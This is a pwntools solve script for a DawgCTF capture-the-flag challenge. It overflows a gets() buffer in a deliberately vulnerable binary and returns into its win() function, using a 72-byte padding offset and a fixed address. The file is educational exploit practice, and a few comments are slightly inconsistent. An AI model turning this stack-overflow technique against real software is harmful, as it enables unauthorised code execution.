#!/usr/bin/env python3
"""
Stacking Flags - DawgCTF 2026
Classic ret2win: gets() overflow → jump to win()
No PIE, no canary, no NX. buffer[64] + 8 rbp = 72 offset to ret addr.
"""
from pwn import *
import sys

HOST = "nc.umbccd.net"
PORT = 8921

context.arch = 'amd64'

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process("./files/stacking_flags")

io = get_process()

# win() address — no-PIE so fixed. Try remote binary's address.
# Local: 0x4011a6. Remote may differ slightly — we'll try common ones.
# Since compilation flags are given, likely same compiler → same layout.
WIN = 0x4011a6
RET = 0x401016  # ret gadget for stack alignment

# buffer[64] + saved rbp (8) = 72 bytes to overwrite return address
# No alignment needed — win() calls exit(0) which doesn't care about RSP alignment
payload = b'A' * 72
payload += p64(WIN)    # return to win()    # return to win()

io.sendline(payload)
io.interactive()
